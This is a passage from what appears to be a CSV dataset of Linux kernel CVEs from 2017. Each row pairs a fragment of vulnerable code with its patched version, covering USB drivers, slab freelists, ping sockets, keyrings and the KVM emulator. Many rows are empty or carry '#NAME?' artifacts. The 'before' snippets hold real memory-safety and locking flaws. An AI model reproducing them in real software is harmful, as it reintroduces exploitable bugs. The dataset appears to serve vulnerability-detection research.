 pipe_buf_release(pipe, &pipe->bufs[idx]);
			idx = next_idx(idx, pipe);
 pipe->nrbufs--;
		}
	}
}

static void pipe_advance(struct iov_iter *i, size_t size)
{
 struct pipe_inode_info *pipe = i->pipe;




 if (unlikely(i->count < size))
		size = i->count;


 if (size) {
 struct pipe_buffer *buf;
 size_t off = i->iov_offset, left = size;
 int idx = i->idx;
 if (off) /* make it relative to the beginning of buffer */
 left += off - pipe->bufs[idx].offset;
 while (1) {
			buf = &pipe->bufs[idx];
 if (left <= buf->len)
 break;
 left -= buf->len;
			idx = next_idx(idx, pipe);
		}

		i->idx = idx;
		i->iov_offset = buf->offset + left;











	}
	i->count -= size;
 /* ... and discard everything past that point */
 pipe_truncate(i);
}

void iov_iter_advance(struct iov_iter *i, size_t size)
 size_t count)
{
 BUG_ON(direction != ITER_PIPE);
 WARN_ON(pipe->nrbufs == pipe->buffers);
	i->type = direction;
	i->pipe = pipe;
	i->idx = (pipe->curbuf + pipe->nrbufs) & (pipe->buffers - 1);
"
2017,#NAME?,CVE-2017-5549,"			     status_buf, KLSI_STATUSBUF_LEN,
 10000
			     );
 if (rc < 0)
 dev_err(&port->dev, ""Reading line status failed (error = %d)\n"",
			rc);
 else {

		status = get_unaligned_le16(status_buf);

 dev_info(&port->serial->dev->dev, ""read status %x %x\n"",
","			     status_buf, KLSI_STATUSBUF_LEN,
 10000
			     );
 if (rc != KLSI_STATUSBUF_LEN) {
 dev_err(&port->dev, ""reading line status failed: %d\n"", rc);
 if (rc >= 0)
			rc = -EIO;
	} else {
		status = get_unaligned_le16(status_buf);

 dev_info(&port->serial->dev->dev, ""read status %x %x\n"",
"
2017,DoS Overflow Mem. Corr. ,CVE-2017-5548,"{
 struct usb_device *usb_dev = atusb->usb_dev;
 int ret;

 uint8_t value;





 dev_dbg(&usb_dev->dev, ""atusb: reg = 0x%x\n"", reg);
	ret = atusb_control_msg(atusb, usb_rcvctrlpipe(usb_dev, 0),
				ATUSB_REG_READ, ATUSB_REQ_FROM_DEV,
 0, reg, &value, 1, 1000);
 return ret >= 0 ? value : ret;








}

static int atusb_write_subreg(struct atusb *atusb, uint8_t reg, uint8_t mask,
static int atusb_get_and_show_revision(struct atusb *atusb)
{
 struct usb_device *usb_dev = atusb->usb_dev;
 unsigned char buffer[3];
 int ret;





 /* Get a couple of the ATMega Firmware values */
	ret = atusb_control_msg(atusb, usb_rcvctrlpipe(usb_dev, 0),
				ATUSB_ID, ATUSB_REQ_FROM_DEV, 0, 0,
 dev_info(&usb_dev->dev, ""Please update to version 0.2 or newer"");
	}


 return ret;
}

static int atusb_get_and_show_build(struct atusb *atusb)
{
 struct usb_device *usb_dev = atusb->usb_dev;
 char build[ATUSB_BUILD_SIZE + 1];
 int ret;





	ret = atusb_control_msg(atusb, usb_rcvctrlpipe(usb_dev, 0),
				ATUSB_BUILD, ATUSB_REQ_FROM_DEV, 0, 0,
				build, ATUSB_BUILD_SIZE, 1000);
 dev_info(&usb_dev->dev, ""Firmware: build %s\n"", build);
	}


 return ret;
}

","{
 struct usb_device *usb_dev = atusb->usb_dev;
 int ret;
 uint8_t *buffer;
 uint8_t value;

	buffer = kmalloc(1, GFP_KERNEL);
 if (!buffer)
 return -ENOMEM;

 dev_dbg(&usb_dev->dev, ""atusb: reg = 0x%x\n"", reg);
	ret = atusb_control_msg(atusb, usb_rcvctrlpipe(usb_dev, 0),
				ATUSB_REG_READ, ATUSB_REQ_FROM_DEV,
 0, reg, buffer, 1, 1000);

 if (ret >= 0) {
		value = buffer[0];
 kfree(buffer);
 return value;
	} else {
 kfree(buffer);
 return ret;
	}
}

static int atusb_write_subreg(struct atusb *atusb, uint8_t reg, uint8_t mask,
static int atusb_get_and_show_revision(struct atusb *atusb)
{
 struct usb_device *usb_dev = atusb->usb_dev;
 unsigned char *buffer;
 int ret;

	buffer = kmalloc(3, GFP_KERNEL);
 if (!buffer)
 return -ENOMEM;

 /* Get a couple of the ATMega Firmware values */
	ret = atusb_control_msg(atusb, usb_rcvctrlpipe(usb_dev, 0),
				ATUSB_ID, ATUSB_REQ_FROM_DEV, 0, 0,
 dev_info(&usb_dev->dev, ""Please update to version 0.2 or newer"");
	}

 kfree(buffer);
 return ret;
}

static int atusb_get_and_show_build(struct atusb *atusb)
{
 struct usb_device *usb_dev = atusb->usb_dev;
 char *build;
 int ret;

	build = kmalloc(ATUSB_BUILD_SIZE + 1, GFP_KERNEL);
 if (!build)
 return -ENOMEM;

	ret = atusb_control_msg(atusb, usb_rcvctrlpipe(usb_dev, 0),
				ATUSB_BUILD, ATUSB_REQ_FROM_DEV, 0, 0,
				build, ATUSB_BUILD_SIZE, 1000);
 dev_info(&usb_dev->dev, ""Firmware: build %s\n"", build);
	}

 kfree(build);
 return ret;
}

"
2017,DoS Overflow Mem. Corr. ,CVE-2017-5547," struct usb_interface *usbif = to_usb_interface(dev->parent);
 struct usb_device *usbdev = interface_to_usbdev(usbif);
 int brightness;
 char data[8];





	ret = usb_control_msg(usbdev, usb_rcvctrlpipe(usbdev, 0),
			      K90_REQUEST_STATUS,
 if (ret < 0) {
 dev_warn(dev, ""Failed to get K90 initial state (error %d).\n"",
			 ret);
 return -EIO;

	}
	brightness = data[4];
 if (brightness < 0 || brightness > 3) {
 dev_warn(dev,
 ""Read invalid backlight brightness: %02hhx.\n"",
			 data[4]);
 return -EIO;

	}
 return brightness;




}

static enum led_brightness k90_record_led_get(struct led_classdev *led_cdev)
 struct usb_interface *usbif = to_usb_interface(dev->parent);
 struct usb_device *usbdev = interface_to_usbdev(usbif);
 const char *macro_mode;
 char data[8];





	ret = usb_control_msg(usbdev, usb_rcvctrlpipe(usbdev, 0),
			      K90_REQUEST_GET_MODE,
 if (ret < 0) {
 dev_warn(dev, ""Failed to get K90 initial mode (error %d).\n"",
			 ret);
 return -EIO;

	}

 switch (data[0]) {
 default:
 dev_warn(dev, ""K90 in unknown mode: %02hhx.\n"",
			 data[0]);
 return -EIO;

	}

 return snprintf(buf, PAGE_SIZE, ""%s\n"", macro_mode);




}

static ssize_t k90_store_macro_mode(struct device *dev,
 struct usb_interface *usbif = to_usb_interface(dev->parent);
 struct usb_device *usbdev = interface_to_usbdev(usbif);
 int current_profile;
 char data[8];





	ret = usb_control_msg(usbdev, usb_rcvctrlpipe(usbdev, 0),
			      K90_REQUEST_STATUS,
 if (ret < 0) {
 dev_warn(dev, ""Failed to get K90 initial state (error %d).\n"",
			 ret);
 return -EIO;

	}
	current_profile = data[7];
 if (current_profile < 1 || current_profile > 3) {
 dev_warn(dev, ""Read invalid current profile: %02hhx.\n"",
			 data[7]);
 return -EIO;

	}

 return snprintf(buf, PAGE_SIZE, ""%d\n"", current_profile);




}

static ssize_t k90_store_current_profile(struct device *dev,
"," struct usb_interface *usbif = to_usb_interface(dev->parent);
 struct usb_device *usbdev = interface_to_usbdev(usbif);
 int brightness;
 char *data;

	data = kmalloc(8, GFP_KERNEL);
 if (!data)
 return -ENOMEM;

	ret = usb_control_msg(usbdev, usb_rcvctrlpipe(usbdev, 0),
			      K90_REQUEST_STATUS,
 if (ret < 0) {
 dev_warn(dev, ""Failed to get K90 initial state (error %d).\n"",
			 ret);
		ret = -EIO;
 goto out;
	}
	brightness = data[4];
 if (brightness < 0 || brightness > 3) {
 dev_warn(dev,
 ""Read invalid backlight brightness: %02hhx.\n"",
			 data[4]);
		ret = -EIO;
 goto out;
	}
	ret = brightness;
out:
 kfree(data);

 return ret;
}

static enum led_brightness k90_record_led_get(struct led_classdev *led_cdev)
 struct usb_interface *usbif = to_usb_interface(dev->parent);
 struct usb_device *usbdev = interface_to_usbdev(usbif);
 const char *macro_mode;
 char *data;

	data = kmalloc(2, GFP_KERNEL);
 if (!data)
 return -ENOMEM;

	ret = usb_control_msg(usbdev, usb_rcvctrlpipe(usbdev, 0),
			      K90_REQUEST_GET_MODE,
 if (ret < 0) {
 dev_warn(dev, ""Failed to get K90 initial mode (error %d).\n"",
			 ret);
		ret = -EIO;
 goto out;
	}

 switch (data[0]) {
 default:
 dev_warn(dev, ""K90 in unknown mode: %02hhx.\n"",
			 data[0]);
		ret = -EIO;
 goto out;
	}

	ret = snprintf(buf, PAGE_SIZE, ""%s\n"", macro_mode);
out:
 kfree(data);

 return ret;
}

static ssize_t k90_store_macro_mode(struct device *dev,
 struct usb_interface *usbif = to_usb_interface(dev->parent);
 struct usb_device *usbdev = interface_to_usbdev(usbif);
 int current_profile;
 char *data;

	data = kmalloc(8, GFP_KERNEL);
 if (!data)
 return -ENOMEM;

	ret = usb_control_msg(usbdev, usb_rcvctrlpipe(usbdev, 0),
			      K90_REQUEST_STATUS,
 if (ret < 0) {
 dev_warn(dev, ""Failed to get K90 initial state (error %d).\n"",
			 ret);
		ret = -EIO;
 goto out;
	}
	current_profile = data[7];
 if (current_profile < 1 || current_profile > 3) {
 dev_warn(dev, ""Read invalid current profile: %02hhx.\n"",
			 data[7]);
		ret = -EIO;
 goto out;
	}

	ret = snprintf(buf, PAGE_SIZE, ""%d\n"", current_profile);
out:
 kfree(data);

 return ret;
}

static ssize_t k90_store_current_profile(struct device *dev,
"
2017,DoS ,CVE-2017-5546," unsigned int pos;
 unsigned int *list;
 unsigned int count;
 unsigned int rand;
	};
 struct rnd_state rnd_state;
};
	} else {
		state->list = cachep->random_seq;
		state->count = count;
		state->pos = 0;
		state->rand = rand;
		ret = true;
	}
 return ret;
/* Get the next entry on the list and randomize it using a random shift */
static freelist_idx_t next_random_slot(union freelist_init_state *state)
{
 return (state->list[state->pos++] + state->rand) % state->count;


}

/* Swap two freelist entries */
"," unsigned int pos;
 unsigned int *list;
 unsigned int count;

	};
 struct rnd_state rnd_state;
};
	} else {
		state->list = cachep->random_seq;
		state->count = count;
		state->pos = rand % count;

		ret = true;
	}
 return ret;
/* Get the next entry on the list and randomize it using a random shift */
static freelist_idx_t next_random_slot(union freelist_init_state *state)
{
 if (state->pos >= state->count)
		state->pos = 0;
 return state->list[state->pos++];
}

/* Swap two freelist entries */
"
2021,,CVE-2017-5123,,
2017,DoS ,CVE-2017-2671,"void ping_unhash(struct sock *sk)
{
 struct inet_sock *isk = inet_sk(sk);

 pr_debug(""ping_unhash(isk=%p,isk->num=%u)\n"", isk, isk->inet_num);

 if (sk_hashed(sk)) {
 write_lock_bh(&ping_table.lock);
 hlist_nulls_del(&sk->sk_nulls_node);
 sk_nulls_node_init(&sk->sk_nulls_node);
 sock_put(sk);
		isk->inet_num = 0;
		isk->inet_sport = 0;
 sock_prot_inuse_add(sock_net(sk), sk->sk_prot, -1);
 write_unlock_bh(&ping_table.lock);
	}

}
EXPORT_SYMBOL_GPL(ping_unhash);

","void ping_unhash(struct sock *sk)
{
 struct inet_sock *isk = inet_sk(sk);

 pr_debug(""ping_unhash(isk=%p,isk->num=%u)\n"", isk, isk->inet_num);
 write_lock_bh(&ping_table.lock);
 if (sk_hashed(sk)) {

 hlist_nulls_del(&sk->sk_nulls_node);
 sk_nulls_node_init(&sk->sk_nulls_node);
 sock_put(sk);
		isk->inet_num = 0;
		isk->inet_sport = 0;
 sock_prot_inuse_add(sock_net(sk), sk->sk_prot, -1);

	}
 write_unlock_bh(&ping_table.lock);
}
EXPORT_SYMBOL_GPL(ping_unhash);

"
2017,DoS +Priv ,CVE-2017-2647," *	""id:<id>""	- request a key matching the ID
 *	""<subtype>:<id>"" - request a key of a subtype
 */
static int asymmetric_key_match(const struct key *key,
  const struct key_match_data *match_data)
{
 const struct asymmetric_key_subtype *subtype = asymmetric_key_subtype(key);
 const char *description = match_data->raw_data;
static int asymmetric_key_match_preparse(struct key_match_data *match_data)
{
	match_data->lookup_type = KEYRING_SEARCH_LOOKUP_ITERATE;

 return 0;
}

	.free_preparse	= asymmetric_key_free_preparse,
	.instantiate	= generic_key_instantiate,
	.match_preparse	= asymmetric_key_match_preparse,
	.match		= asymmetric_key_match,
	.match_free	= asymmetric_key_match_free,
	.destroy	= asymmetric_key_destroy,
	.describe	= asymmetric_key_describe,
	.preparse		= pkcs7_preparse,
	.free_preparse		= user_free_preparse,
	.instantiate		= generic_key_instantiate,
	.match			= user_match,
	.revoke			= user_revoke,
	.destroy		= user_destroy,
	.describe		= user_describe,
struct key_type cifs_spnego_key_type = {
	.name		= ""cifs.spnego"",
	.instantiate	= cifs_spnego_key_instantiate,
	.match		= user_match,
	.destroy	= cifs_spnego_key_destroy,
	.describe	= user_describe,
};
	.instantiate = cifs_idmap_key_instantiate,
	.destroy     = cifs_idmap_key_destroy,
	.describe    = user_describe,
	.match       = user_match,
};

static char *
	.preparse	= user_preparse,
	.free_preparse	= user_free_preparse,
	.instantiate	= generic_key_instantiate,
	.match		= user_match,
	.revoke		= user_revoke,
	.destroy	= user_destroy,
	.describe	= user_describe,
	.preparse	= user_preparse,
	.free_preparse	= user_free_preparse,
	.instantiate	= generic_key_instantiate,
	.match		= user_match,
	.revoke		= user_revoke,
	.destroy	= user_destroy,
	.describe	= user_describe,
extern struct key_type key_type_logon;

struct key_preparsed_payload;
struct key_match_data;

extern int user_preparse(struct key_preparsed_payload *prep);
extern void user_free_preparse(struct key_preparsed_payload *prep);
extern int user_update(struct key *key, struct key_preparsed_payload *prep);
extern int user_match(const struct key *key,
 const struct key_match_data *match_data);
extern void user_revoke(struct key *key);
extern void user_destroy(struct key *key);
extern void user_describe(const struct key *user, struct seq_file *m);
 */
 int (*match_preparse)(struct key_match_data *match_data);

 /* match a key against a description */
 int (*match)(const struct key *key,
 const struct key_match_data *match_data);

 /* Free preparsed match data (optional).  This should be supplied it
	 * ->match_preparse() is supplied. */
 void (*match_free)(struct key_match_data *match_data);
	.preparse	= ceph_key_preparse,
	.free_preparse	= ceph_key_free_preparse,
	.instantiate	= generic_key_instantiate,
	.match		= user_match,
	.destroy	= ceph_key_destroy,
};

 * The domain name may be a simple name or an absolute domain name (which
 * should end with a period).  The domain name is case-independent.
 */
static int
dns_resolver_match(const struct key *key,
 const struct key_match_data *match_data)
{
 int slen, dlen, ret = 0;
 const char *src = key->description, *dsp = match_data->raw_data;
 return ret;
}











/*
 * Describe a DNS key
 */
	.preparse	= dns_resolver_preparse,
	.free_preparse	= dns_resolver_free_preparse,
	.instantiate	= generic_key_instantiate,
	.match		= dns_resolver_match,
	.revoke		= user_revoke,
	.destroy	= user_destroy,
	.describe	= dns_resolver_describe,
	.preparse	= rxrpc_preparse,
	.free_preparse	= rxrpc_free_preparse,
	.instantiate	= generic_key_instantiate,
	.match		= user_match,
	.destroy	= rxrpc_destroy,
	.describe	= rxrpc_describe,
	.read		= rxrpc_read,
	.preparse	= rxrpc_preparse_s,
	.free_preparse	= rxrpc_free_preparse_s,
	.instantiate	= generic_key_instantiate,
	.match		= user_match,
	.destroy	= rxrpc_destroy_s,
	.describe	= rxrpc_describe,
};
	.preparse		= big_key_preparse,
	.free_preparse		= big_key_free_preparse,
	.instantiate		= generic_key_instantiate,
	.match			= user_match,
	.revoke			= big_key_revoke,
	.destroy		= big_key_destroy,
	.describe		= big_key_describe,
	.name = ""encrypted"",
	.instantiate = encrypted_instantiate,
	.update = encrypted_update,
	.match = user_match,
	.destroy = encrypted_destroy,
	.describe = user_describe,
	.read = encrypted_read,
 struct timespec		now;
};



extern key_ref_t keyring_search_aux(key_ref_t keyring_ref,
 struct keyring_search_context *ctx);

	}

	key_ref = ERR_PTR(-EINVAL);
 if (!index_key.type->match || !index_key.type->instantiate ||
	    (!index_key.description && !index_key.type->preparse))
 goto error_put_type;

	.preparse	= keyring_preparse,
	.free_preparse	= keyring_free_preparse,
	.instantiate	= keyring_instantiate,
	.match		= user_match,
	.revoke		= keyring_revoke,
	.destroy	= keyring_destroy,
	.describe	= keyring_describe,
}
EXPORT_SYMBOL(keyring_alloc);










/*
 * Iteration function to consider each key found.
 */
		.index_key.type		= type,
		.index_key.description	= description,
		.cred			= current_cred(),
		.match_data.cmp		= type->match,
		.match_data.raw_data	= description,
		.match_data.lookup_type	= KEYRING_SEARCH_LOOKUP_DIRECT,
		.flags			= KEYRING_SEARCH_DO_STATE_CHECK,
	};
 key_ref_t key;
 int ret;

 if (!ctx.match_data.cmp)
 return ERR_PTR(-ENOKEY);

 if (type->match_preparse) {
		ret = type->match_preparse(&ctx.match_data);
 if (ret < 0)
		.index_key.type		= type,
		.index_key.description	= description,
		.cred			= current_cred(),
		.match_data.cmp		= type->match,
		.match_data.raw_data	= description,
		.match_data.lookup_type	= KEYRING_SEARCH_LOOKUP_DIRECT,
	};
		.index_key.type		= &key_type_request_key_auth,
		.index_key.description	= description,
		.cred			= current_cred(),
		.match_data.cmp		= user_match,
		.match_data.raw_data	= description,
		.match_data.lookup_type	= KEYRING_SEARCH_LOOKUP_DIRECT,
	};
	.name = ""trusted"",
	.instantiate = trusted_instantiate,
	.update = trusted_update,
	.match = user_match,
	.destroy = trusted_destroy,
	.describe = user_describe,
	.read = trusted_read,
	.free_preparse		= user_free_preparse,
	.instantiate		= generic_key_instantiate,
	.update			= user_update,
	.match			= user_match,
	.revoke			= user_revoke,
	.destroy		= user_destroy,
	.describe		= user_describe,
	.free_preparse		= user_free_preparse,
	.instantiate		= generic_key_instantiate,
	.update			= user_update,
	.match			= user_match,
	.revoke			= user_revoke,
	.destroy		= user_destroy,
	.describe		= user_describe,

EXPORT_SYMBOL_GPL(user_update);

/*
 * match users on their name
 */
int user_match(const struct key *key, const struct key_match_data *match_data)
{
 return strcmp(key->description, match_data->raw_data) == 0;
}

EXPORT_SYMBOL_GPL(user_match);

/*
 * dispose of the links from a revoked keyring
 * - called with the key sem write-locked
"," *	""id:<id>""	- request a key matching the ID
 *	""<subtype>:<id>"" - request a key of a subtype
 */
static int asymmetric_key_cmp(const struct key *key,
  const struct key_match_data *match_data)
{
 const struct asymmetric_key_subtype *subtype = asymmetric_key_subtype(key);
 const char *description = match_data->raw_data;
static int asymmetric_key_match_preparse(struct key_match_data *match_data)
{
	match_data->lookup_type = KEYRING_SEARCH_LOOKUP_ITERATE;
	match_data->cmp = asymmetric_key_cmp;
 return 0;
}

	.free_preparse	= asymmetric_key_free_preparse,
	.instantiate	= generic_key_instantiate,
	.match_preparse	= asymmetric_key_match_preparse,

	.match_free	= asymmetric_key_match_free,
	.destroy	= asymmetric_key_destroy,
	.describe	= asymmetric_key_describe,
	.preparse		= pkcs7_preparse,
	.free_preparse		= user_free_preparse,
	.instantiate		= generic_key_instantiate,

	.revoke			= user_revoke,
	.destroy		= user_destroy,
	.describe		= user_describe,
struct key_type cifs_spnego_key_type = {
	.name		= ""cifs.spnego"",
	.instantiate	= cifs_spnego_key_instantiate,

	.destroy	= cifs_spnego_key_destroy,
	.describe	= user_describe,
};
	.instantiate = cifs_idmap_key_instantiate,
	.destroy     = cifs_idmap_key_destroy,
	.describe    = user_describe,

};

static char *
	.preparse	= user_preparse,
	.free_preparse	= user_free_preparse,
	.instantiate	= generic_key_instantiate,

	.revoke		= user_revoke,
	.destroy	= user_destroy,
	.describe	= user_describe,
	.preparse	= user_preparse,
	.free_preparse	= user_free_preparse,
	.instantiate	= generic_key_instantiate,

	.revoke		= user_revoke,
	.destroy	= user_destroy,
	.describe	= user_describe,
extern struct key_type key_type_logon;

struct key_preparsed_payload;


extern int user_preparse(struct key_preparsed_payload *prep);
extern void user_free_preparse(struct key_preparsed_payload *prep);
extern int user_update(struct key *key, struct key_preparsed_payload *prep);


extern void user_revoke(struct key *key);
extern void user_destroy(struct key *key);
extern void user_describe(const struct key *user, struct seq_file *m);
 */
 int (*match_preparse)(struct key_match_data *match_data);





 /* Free preparsed match data (optional).  This should be supplied it
	 * ->match_preparse() is supplied. */
 void (*match_free)(struct key_match_data *match_data);
	.preparse	= ceph_key_preparse,
	.free_preparse	= ceph_key_free_preparse,
	.instantiate	= generic_key_instantiate,

	.destroy	= ceph_key_destroy,
};

 * The domain name may be a simple name or an absolute domain name (which
 * should end with a period).  The domain name is case-independent.
 */
static int dns_resolver_cmp(const struct key *key,
 const struct key_match_data *match_data)

{
 int slen, dlen, ret = 0;
 const char *src = key->description, *dsp = match_data->raw_data;
 return ret;
}

/*
 * Preparse the match criterion.
 */
static int dns_resolver_match_preparse(struct key_match_data *match_data)
{
	match_data->lookup_type = KEYRING_SEARCH_LOOKUP_ITERATE;
	match_data->cmp = dns_resolver_cmp;
 return 0;
}

/*
 * Describe a DNS key
 */
	.preparse	= dns_resolver_preparse,
	.free_preparse	= dns_resolver_free_preparse,
	.instantiate	= generic_key_instantiate,
	.match_preparse	= dns_resolver_match_preparse,
	.revoke		= user_revoke,
	.destroy	= user_destroy,
	.describe	= dns_resolver_describe,
	.preparse	= rxrpc_preparse,
	.free_preparse	= rxrpc_free_preparse,
	.instantiate	= generic_key_instantiate,

	.destroy	= rxrpc_destroy,
	.describe	= rxrpc_describe,
	.read		= rxrpc_read,
	.preparse	= rxrpc_preparse_s,
	.free_preparse	= rxrpc_free_preparse_s,
	.instantiate	= generic_key_instantiate,

	.destroy	= rxrpc_destroy_s,
	.describe	= rxrpc_describe,
};
	.preparse		= big_key_preparse,
	.free_preparse		= big_key_free_preparse,
	.instantiate		= generic_key_instantiate,

	.revoke			= big_key_revoke,
	.destroy		= big_key_destroy,
	.describe		= big_key_describe,
	.name = ""encrypted"",
	.instantiate = encrypted_instantiate,
	.update = encrypted_update,

	.destroy = encrypted_destroy,
	.describe = user_describe,
	.read = encrypted_read,
 struct timespec		now;
};

extern int key_default_cmp(const struct key *key,
 const struct key_match_data *match_data);
extern key_ref_t keyring_search_aux(key_ref_t keyring_ref,
 struct keyring_search_context *ctx);

	}

	key_ref = ERR_PTR(-EINVAL);
 if (!index_key.type->instantiate ||
	    (!index_key.description && !index_key.type->preparse))
 goto error_put_type;

	.preparse	= keyring_preparse,
	.free_preparse	= keyring_free_preparse,
	.instantiate	= keyring_instantiate,

	.revoke		= keyring_revoke,
	.destroy	= keyring_destroy,
	.describe	= keyring_describe,
}
EXPORT_SYMBOL(keyring_alloc);

/*
 * By default, we keys found by getting an exact match on their descriptions.
 */
int key_default_cmp(const struct key *key,
 const struct key_match_data *match_data)
{
 return strcmp(key->description, match_data->raw_data) == 0;
}

/*
 * Iteration function to consider each key found.
 */
		.index_key.type		= type,
		.index_key.description	= description,
		.cred			= current_cred(),
		.match_data.cmp		= key_default_cmp,
		.match_data.raw_data	= description,
		.match_data.lookup_type	= KEYRING_SEARCH_LOOKUP_DIRECT,
		.flags			= KEYRING_SEARCH_DO_STATE_CHECK,
	};
 key_ref_t key;
 int ret;




 if (type->match_preparse) {
		ret = type->match_preparse(&ctx.match_data);
 if (ret < 0)
		.index_key.type		= type,
		.index_key.description	= description,
		.cred			= current_cred(),
		.match_data.cmp		= key_default_cmp,
		.match_data.raw_data	= description,
		.match_data.lookup_type	= KEYRING_SEARCH_LOOKUP_DIRECT,
	};
		.index_key.type		= &key_type_request_key_auth,
		.index_key.description	= description,
		.cred			= current_cred(),
		.match_data.cmp		= key_default_cmp,
		.match_data.raw_data	= description,
		.match_data.lookup_type	= KEYRING_SEARCH_LOOKUP_DIRECT,
	};
	.name = ""trusted"",
	.instantiate = trusted_instantiate,
	.update = trusted_update,

	.destroy = trusted_destroy,
	.describe = user_describe,
	.read = trusted_read,
	.free_preparse		= user_free_preparse,
	.instantiate		= generic_key_instantiate,
	.update			= user_update,

	.revoke			= user_revoke,
	.destroy		= user_destroy,
	.describe		= user_describe,
	.free_preparse		= user_free_preparse,
	.instantiate		= generic_key_instantiate,
	.update			= user_update,

	.revoke			= user_revoke,
	.destroy		= user_destroy,
	.describe		= user_describe,

EXPORT_SYMBOL_GPL(user_update);











/*
 * dispose of the links from a revoked keyring
 * - called with the key sem write-locked
"
2017,DoS +Priv ,CVE-2017-2636,,
2018,Overflow Mem. Corr. ,CVE-2017-2634,,
2018,,CVE-2017-2618,,
2017,DoS ,CVE-2017-2596,,
2017,DoS +Info ,CVE-2017-2584," return ctxt->ops->read_std(ctxt, linear, data, size, &ctxt->exception);
}















/*
 * Prefetch the remaining bytes of the instruction without crossing page
 * boundary if they are not in fetch_cache yet.
	}
 /* Disable writeback. */
	ctxt->dst.type = OP_NONE;
 return segmented_write(ctxt, ctxt->dst.addr.mem,
     &desc_ptr, 2 + ctxt->op_bytes);
}

static int em_sgdt(struct x86_emulate_ctxt *ctxt)
 else
		size = offsetof(struct fxregs_state, xmm_space[0]);

 return segmented_write(ctxt, ctxt->memop.addr.mem, &fx_state, size);
}

static int fxrstor_fixup(struct x86_emulate_ctxt *ctxt,
 if (rc != X86EMUL_CONTINUE)
 return rc;

	rc = segmented_read(ctxt, ctxt->memop.addr.mem, &fx_state, 512);
 if (rc != X86EMUL_CONTINUE)
 return rc;

"," return ctxt->ops->read_std(ctxt, linear, data, size, &ctxt->exception);
}

static int segmented_write_std(struct x86_emulate_ctxt *ctxt,
 struct segmented_address addr,
 void *data,
 unsigned int size)
{
 int rc;
	ulong linear;

	rc = linearize(ctxt, addr, size, true, &linear);
 if (rc != X86EMUL_CONTINUE)
 return rc;
 return ctxt->ops->write_std(ctxt, linear, data, size, &ctxt->exception);
}

/*
 * Prefetch the remaining bytes of the instruction without crossing page
 * boundary if they are not in fetch_cache yet.
	}
 /* Disable writeback. */
	ctxt->dst.type = OP_NONE;
 return segmented_write_std(ctxt, ctxt->dst.addr.mem,
     &desc_ptr, 2 + ctxt->op_bytes);
}

static int em_sgdt(struct x86_emulate_ctxt *ctxt)
 else
		size = offsetof(struct fxregs_state, xmm_space[0]);

 return segmented_write_std(ctxt, ctxt->memop.addr.mem, &fx_state, size);
}

static int fxrstor_fixup(struct x86_emulate_ctxt *ctxt,
 if (rc != X86EMUL_CONTINUE)
 return rc;

	rc = segmented_read_std(ctxt, ctxt->memop.addr.mem, &fx_state, 512);
 if (rc != X86EMUL_CONTINUE)
 return rc;

"
2017,DoS +Priv ,CVE-2017-2583,"				    &ctxt->exception);
}

/* Does not support long mode */
static int __load_segment_descriptor(struct x86_emulate_ctxt *ctxt,
				     u16 selector, int seg, u8 cpl,
 enum x86_transfer_type transfer,

	rpl = selector & 3;

 /* NULL selector is not valid for TR, CS and SS (except for long mode) */
 if ((seg == VCPU_SREG_CS
	     || (seg == VCPU_SREG_SS
		 && (ctxt->mode != X86EMUL_MODE_PROT64 || rpl != cpl))
	     || seg == VCPU_SREG_TR)
	    && null_selector)
 goto exception;

 /* TR should be in GDT only */
 if (seg == VCPU_SREG_TR && (selector & (1 << 2)))
 goto exception;

 if (null_selector) /* for NULL selector skip all following checks */





















 goto load;


	ret = read_segment_descriptor(ctxt, selector, &seg_desc, &desc_addr);
 if (ret != X86EMUL_CONTINUE)
				   u16 selector, int seg)
{
	u8 cpl = ctxt->ops->cpl(ctxt);















 return __load_segment_descriptor(ctxt, selector, seg, cpl,
					 X86_TRANSFER_NONE, NULL);
}
","				    &ctxt->exception);
}


static int __load_segment_descriptor(struct x86_emulate_ctxt *ctxt,
				     u16 selector, int seg, u8 cpl,
 enum x86_transfer_type transfer,

	rpl = selector & 3;









 /* TR should be in GDT only */
 if (seg == VCPU_SREG_TR && (selector & (1 << 2)))
 goto exception;

 /* NULL selector is not valid for TR, CS and (except for long mode) SS */
 if (null_selector) {
 if (seg == VCPU_SREG_CS || seg == VCPU_SREG_TR)
 goto exception;

 if (seg == VCPU_SREG_SS) {
 if (ctxt->mode != X86EMUL_MODE_PROT64 || rpl != cpl)
 goto exception;

 /*
			 * ctxt->ops->set_segment expects the CPL to be in
			 * SS.DPL, so fake an expand-up 32-bit data segment.
 */
			seg_desc.type = 3;
			seg_desc.p = 1;
			seg_desc.s = 1;
			seg_desc.dpl = cpl;
			seg_desc.d = 1;
			seg_desc.g = 1;
		}

 /* Skip all following checks */
 goto load;
	}

	ret = read_segment_descriptor(ctxt, selector, &seg_desc, &desc_addr);
 if (ret != X86EMUL_CONTINUE)
				   u16 selector, int seg)
{
	u8 cpl = ctxt->ops->cpl(ctxt);

 /*
	 * None of MOV, POP and LSS can load a NULL selector in CPL=3, but
	 * they can load it at CPL<3 (Intel's manual says only LSS can,
	 * but it's wrong).
	 *
	 * However, the Intel manual says that putting IST=1/DPL=3 in
	 * an interrupt gate will result in SS=3 (the AMD manual instead
	 * says it doesn't), so allow SS=3 in __load_segment_descriptor
	 * and only forbid it here.
 */
 if (seg == VCPU_SREG_SS && selector == 3 &&
	    ctxt->mode == X86EMUL_MODE_PROT64)
 return emulate_exception(ctxt, GP_VECTOR, 0, true);

 return __load_segment_descriptor(ctxt, selector, seg, cpl,
					 X86_TRANSFER_NONE, NULL);
}
"
2017,#NAME?,CVE-2017-0651,,
2017,#NAME?,CVE-2017-0650,,
2017,Exec Code ,CVE-2017-0648,,
2017,#NAME?,CVE-2017-0634,,
2017,#NAME?,CVE-2017-0633,,
2017,#NAME?,CVE-2017-0632,,
2017,#NAME?,CVE-2017-0631,,
2017,#NAME?,CVE-2017-0630,,
2017,#NAME?,CVE-2017-0629,,
2017,#NAME?,CVE-2017-0628,,
2017,#NAME?,CVE-2017-0627,,
2017,#NAME?,CVE-2017-0626,,
2017,#NAME?,CVE-2017-0624,,
2017,Exec Code ,CVE-2017-0623,,
2017,Exec Code ,CVE-2017-0622,,
2017,Exec Code ,CVE-2017-0621,,
2017,Exec Code ,CVE-2017-0620,,
2017,Exec Code ,CVE-2017-0619,,
2017,Exec Code ,CVE-2017-0614,,
2017,Exec Code ,CVE-2017-0613,,
2017,Exec Code ,CVE-2017-0612,,
2017,Exec Code ,CVE-2017-0611,,
2017,Exec Code ,CVE-2017-0610,,
2017,Exec Code ,CVE-2017-0609,,
2017,Exec Code ,CVE-2017-0608,,
2017,Exec Code ,CVE-2017-0607,,
2017,Exec Code ,CVE-2017-0606,,
2017,#NAME?,CVE-2017-0586,,
